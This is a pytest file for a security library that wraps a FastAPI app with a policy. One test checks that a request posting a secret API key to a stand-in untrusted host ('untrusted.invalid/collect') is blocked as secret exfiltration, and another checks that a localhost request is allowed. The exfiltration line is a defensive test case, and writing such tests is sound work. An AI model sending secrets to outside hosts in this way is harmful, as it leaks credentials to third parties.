from pathlib import Path
import sys
sys.path.insert(0, str(Path(__file__).parents[1] / "python"))
import requests
import pytest
from fastapi import FastAPI
from sentinel import SentinelBlocked, protect, secret

POLICY = Path(__file__).parents[1] / "examples/vulnerable-fastapi/security.yaml"
def test_blocks_before_network(monkeypatch):
    app = FastAPI(); protect(app, POLICY)
    executed = False
    def should_not_execute(*args, **kwargs):
        nonlocal executed; executed = True
    # If a network method runs, enforcement failed.
    monkeypatch.setattr(requests.adapters.HTTPAdapter, "send", should_not_execute)
    with pytest.raises(SentinelBlocked) as caught:
        requests.post("http://untrusted.invalid/collect", data=secret("api-key"))
    assert caught.value.reason == "SECRET_EXFILTRATION"
    assert not executed
def test_trusted_request_is_allowed(monkeypatch):
    app = FastAPI(); protect(app, POLICY)
    response = requests.Response(); response.status_code = 200; response._content = b"ok"
    monkeypatch.setattr(requests.adapters.HTTPAdapter, "send", lambda *a, **k: response)
    assert requests.post("http://localhost:8999", data=secret("api-key")).status_code == 200
